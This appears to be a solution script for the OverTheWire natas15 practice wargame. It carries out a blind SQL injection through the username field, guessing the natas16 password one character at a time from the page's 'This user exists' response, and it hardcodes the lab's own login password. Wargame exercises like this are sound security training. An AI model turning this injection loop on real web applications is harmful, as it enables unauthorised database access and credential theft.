import requests

session = requests.Session()

username = 'natas15'
natas15_password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
url = "http://natas15.natas.labs.overthewire.org/"

ascii_chars = 'adfgijklqruADEHOPRTVZ23579'

password = ''
underscore = '_'
underscore_length = 0

while len(password) < 32:
    for char in ascii_chars:
        payload = f'natas16" AND BINARY password LIKE \'{underscore * underscore_length + char}%\' #'
        data = {'username': payload}

        response = session.post(url, auth=requests.auth.HTTPBasicAuth(username, natas15_password), data=data)
        print(char, end=' ')
        if 'This user exists' in response.text:
            print('password', char)
            password += char
            underscore_length += 1
            print(password)

session.close()
